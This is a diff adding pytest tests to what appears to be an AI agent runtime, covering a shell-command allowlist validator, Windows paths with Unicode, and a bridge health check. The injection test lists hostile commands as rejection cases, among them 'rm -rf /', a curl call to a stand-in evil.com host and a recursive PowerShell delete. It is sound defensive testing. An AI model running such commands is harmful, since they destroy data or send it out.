@@ -267,3 +267,76 @@ def test_restart_recovery_and_rollback_integrity(tmp_path: Path):
     # Update database status to rolled_back
     restarted_repo.update_agent_work_status("WORK-RESTART-001", "rolled_back")
     assert restarted_repo.get_agent_work("WORK-RESTART-001").status == "rolled_back"
+
+
+def test_prompt_injection_and_command_injection_defense():
+    """Verify that command injection and malicious shell constructs are blocked."""
+    allowed = ("pytest tests/unit", "pytest -q")
+
+    # Injections via shell metacharacters must fail
+    malicious_commands = [
+        "pytest tests/unit; rm -rf /",
+        "pytest tests/unit && curl https://evil.com/leak",
+        "pytest tests/unit | python -c 'import os; os.system(\"calc\")'",
+        "pytest tests/unit `whoami`",
+        "pytest tests/unit $(whoami)",
+        "pytest tests/unit > /tmp/pwned",
+        "powershell -Command Remove-Item -Recurse C:\\",
+        "cmd.exe /c dir",
+    ]
+    for cmd in malicious_commands:
+        with pytest.raises(AgentPolicyError, match="(ký tự đặc biệt|không nằm trong danh sách)"):
+            validate_test_command(cmd, allowed_commands=allowed)
+
+    # Legitimate allowed commands must pass
+    assert validate_test_command("pytest tests/unit", allowed_commands=allowed) == "pytest tests/unit"
+    assert validate_test_command("pytest -q", allowed_commands=allowed) == "pytest -q"
+
+
+def test_windows_paths_with_spaces_and_backslashes(tmp_path: Path):
+    """Verify handling of Windows-style backslashes and folder names with spaces and Unicode."""
+    task_root = tmp_path / "Xưởng Lắp Ráp 2026"
+    task_root.mkdir()
+
+    grant = create_scope_grant(
+        work_id="WORK-WIN-001",
+        task_root=task_root,
+        task_type=TASK_TYPE_CODE_CHANGE,
+    )
+    adapter = OpenCodeRuntimeAdapter(grant=grant)
+
+    # Windows path with backslashes and spaces
+    rel_path = "Dây Chuyền 1\\Báo Cáo Tiến Độ.txt"
+    content = "Hoàn tất kiểm tra chất lượng 100% không lỗi."
+
+    receipt = adapter.execute_request(
+        RuntimeRequest(
+            work_id="WORK-WIN-001",
+            action="create_file",
+            payload={"path": rel_path, "content": content},
+        )
+    )
+    assert receipt.status == "passed"
+
+    read_receipt = adapter.execute_request(
+        RuntimeRequest(
+            work_id="WORK-WIN-001",
+            action="read_file",
+            payload={"path": rel_path},
+        )
+    )
+    assert read_receipt.status == "passed"
+    assert read_receipt.payload["content"] == content
+
+
+def test_antigravity_bridge_non_regression():
+    """Verify that Antigravity bridge integration remains preserved and untouched."""
+    from aios_habit.antigravity_bridge import (
+        DEFAULT_ANTIGRAVITY_HEALTH_URL,
+        get_antigravity_bridge_health,
+    )
+    assert DEFAULT_ANTIGRAVITY_HEALTH_URL.startswith("http")
+    # Fails closed when bridge is offline
+    health = get_antigravity_bridge_health("http://127.0.0.1:65530/health")
+    assert health.is_ready is False
+    assert health.status == "unavailable"
